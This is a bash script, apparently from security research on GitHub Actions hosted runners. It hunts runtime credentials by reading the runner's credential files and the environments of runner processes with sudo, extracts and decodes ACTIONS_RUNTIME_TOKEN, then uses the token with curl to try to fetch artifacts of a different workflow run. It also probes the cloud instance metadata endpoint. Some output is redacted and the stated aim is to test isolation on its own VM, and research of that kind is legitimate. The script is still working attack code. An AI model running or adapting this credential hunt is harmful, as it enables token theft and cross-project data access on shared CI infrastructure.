#!/usr/bin/env bash
# T1/T2 merged: hunt runtime credentials/endpoints on the hosted runner (own VM),
# then run cross-repo oracle with anything found. All output goes to stdout (tee'd to reports/).
set -u

echo "== [0] env surface (secrets redacted by name filter)"
env | sort | grep -viE '(TOKEN|SECRET|PASSWORD|KEY)=' || true

echo "== [1] identity & sudo"
id || true
sudo -n true 2>/dev/null && echo "passwordless sudo: YES" || echo "passwordless sudo: NO"

echo "== [2] agent files"
sudo ls -la /home/runner/actions-runner/ 2>/dev/null | head -30 || true
for f in .runner .credentials .credentials_rsajs; do
  FP="/home/runner/actions-runner/$f"
  if sudo test -s "$FP" 2>/dev/null; then
    echo "--- $f exists ($(sudo stat -c%s "$FP" 2>/dev/null) bytes), keys/shape (values redacted):"
    sudo cat "$FP" 2>/dev/null | python3 -c "
import sys
raw = sys.stdin.read()
try:
    import json
    d = json.loads(raw)
    for k, v in d.items():
        s = str(v)
        print(f'{k}: {s[:8]}...len={len(s)}' if len(s) > 14 else f'{k}: {s}')
except Exception:
    print(raw[:180].replace(chr(10), ' '))
" || true
  else
    echo "--- $f: NOT FOUND"
  fi
done

echo "== [3] runner processes & environments (credential hunt)"
for pid in $(pgrep -f 'Runner|AgentService' 2>/dev/null || true); do
  comm=$(cat /proc/$pid/comm 2>/dev/null || echo '?')
  case "$comm" in
    Runner.Listener|Runner.Worker|AgentService|dotnet|Runner.FileC*) ;;
    *) continue ;;
  esac
  echo "--- PID $pid comm=$comm"
  sudo cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' \
    | grep -E '^(ACTIONS|GITHUB|RUNNER|DISPATCH|VSO|AGENT)_|URL|TOKEN' \
    | sed -E 's/^([^=]*(TOKEN|SECRET)[^=]*=)(.{6}).*/\1\3<redacted>/' | head -40 || true
done

echo "== [4] listening sockets (localhost proxy candidates)"
sudo ss -tlnp 2>/dev/null | head -15 || true

echo "== [5] token hunt in process environments -> oracle if found"
HUNT_TOKEN=""
HUNT_RESULTS=""
for pid in $(pgrep -f 'Runner|AgentService' 2>/dev/null || true); do
  ENVS=$(sudo cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' || true)
  if [ -z "$HUNT_TOKEN" ]; then
    HUNT_TOKEN=$(echo "$ENVS" | grep -oE '^ACTIONS_RUNTIME_TOKEN=.*' | head -1 | cut -d= -f2-)
  fi
  if [ -z "$HUNT_RESULTS" ]; then
    HUNT_RESULTS=$(echo "$ENVS" | grep -oE '^ACTIONS_RESULTS_URL=.*' | head -1 | cut -d= -f2-)
  fi
done
if [ -z "$HUNT_TOKEN" ]; then
  # fall back: runner may expose it via GITHUB_ENV files or step-level env of worker
  HUNT_TOKEN=$(cat /proc/self/environ | tr '\0' '\n' | grep -oE '^ACTIONS_RUNTIME_TOKEN=.*' | head -1 | cut -d= -f2-)
fi
echo "hunt: token_found=$([ -n "$HUNT_TOKEN" ] && echo YES || echo NO)  results_url=${HUNT_RESULTS:-none}"

if [ -n "$HUNT_TOKEN" ]; then
  echo "== [6] JWT payload of hunted token"
  python3 - "$HUNT_TOKEN" <<'EOF'
import base64, json, sys
try:
    p = sys.argv[1].split('.')[1]
    p += '=' * (-len(p) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=1, sort_keys=True))
except Exception as e:
    print('decode error:', e)
EOF
  BASES=$(printf '%s\n' "${HUNT_RESULTS:-}" | grep -E '^https' || true)
  B_RUN_ID="${B_RUN_ID:-0}"
  for B in $BASES; do
    for RID in "$GITHUB_RUN_ID" "$B_RUN_ID"; do
      tag=$([ "$RID" = "$GITHUB_RUN_ID" ] && echo own || echo cross)
      C=$(curl -sS -m 20 -o /tmp/o.out -w "%{http_code}" -H "Authorization: Bearer $HUNT_TOKEN" \
          "${B}_apis/pipelines/workflowruns/$RID/artifacts?api-version=6.0-preview" 2>/dev/null || echo 000)
      echo "GET artifacts @$B run=$RID ($tag): $C   <-- cross 200=HIGH FINDING"
      head -c 200 /tmp/o.out; echo
    done
  done
else
  echo "== [6] no runtime token reachable from step context (confirms env hardening)"
fi

echo "== [7] IMDS reachability (status code only)"
curl -sS -m 3 -o /dev/null -w "IMDS: %{http_code}\n" -H 'Metadata:true' \
  'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo "IMDS: unreachable"
echo "CREDHUNT DONE"
